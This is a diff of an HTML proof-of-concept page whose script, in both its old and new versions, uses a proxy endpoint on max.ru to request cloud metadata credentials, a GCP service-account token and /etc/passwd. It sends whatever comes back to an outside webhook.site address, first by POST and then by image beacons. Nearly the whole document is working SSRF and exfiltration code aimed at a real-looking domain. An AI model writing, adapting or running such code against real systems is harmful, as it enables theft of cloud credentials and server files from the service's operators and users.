@@ -2,47 +2,49 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://max.ru/proxy?url=http://169.254.169.254.nip.io/latest/meta-data/">
-    <title>Security Audit</title>
+    <title>PoC Test</title>
 </head>
 <body>
     <script>
-        const webhook = "https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6";
-        const proxy = "/proxy?url="; // Используем относительный путь, если запускаем с домена max.ru
-        const fullProxy = "https://max.ru/proxy?url=";
+        const hook = "https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6";
+        const proxy = "https://max.ru/proxy?url=";
         
-        const sensitiveUrls = [
-            "http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/default",
-            "http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token?header=Metadata-Flavor:Google",
-            "file:///etc/passwd"
-        ];
+        // Массив целей
+        const targets = {
+            "passwd": "file:///etc/passwd",
+            "metadata": "http://169.254.169.254.nip.io/latest/meta-data/",
+            "token": "http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token"
+        };
 
-        async function extract() {
-            for (let target of sensitiveUrls) {
+        // Функция отправки через картинку (не блокируется CORS)
+        function sendSignal(name, data) {
+            const img = new Image();
+            img.src = `${hook}?type=${name}&info=${encodeURIComponent(data)}&nocache=${Math.random()}`;
+        }
+
+        async function run() {
+            // Сигнал о запуске
+            sendSignal("START", "Browser_Exploit_Active");
+
+            for (let key in targets) {
                 try {
-                    // Пытаемся прочитать данные через их прокси
-                    const response = await fetch(fullProxy + encodeURIComponent(target));
-                    const content = await response.text();
+                    const url = proxy + encodeURIComponent(targets[key]);
+                    
+                    // Пытаемся получить данные
+                    const r = await fetch(url);
+                    const text = await r.text();
 
-                    // Если в ответе есть что-то кроме стандартного HTML max.ru
-                    // (например, слово "root" или "access_token") - шлем на вебхук
-                    if (content.length > 0) {
-                        await fetch(webhook, {
-                            method: 'POST',
-                            mode: 'no-cors',
-                            body: JSON.stringify({
-                                target: target,
-                                data: content.substring(0, 500) // Берем первые 500 символов
-                            })
-                        });
+                    if (text.length > 0) {
+                        // Отправляем первые 100 символов ответа
+                        sendSignal("SUCCESS_" + key, text.substring(0, 100));
                     }
                 } catch (e) {
-                    // Если ошибка, шлем сигнал о блокировке
-                    fetch(webhook + "?error=blocked&target=" + btoa(target));
+                    sendSignal("BLOCKED_" + key, "CORS_or_Filter");
                 }
             }
         }
-        extract();
+
+        run();
     </script>
 </body>
 </html>
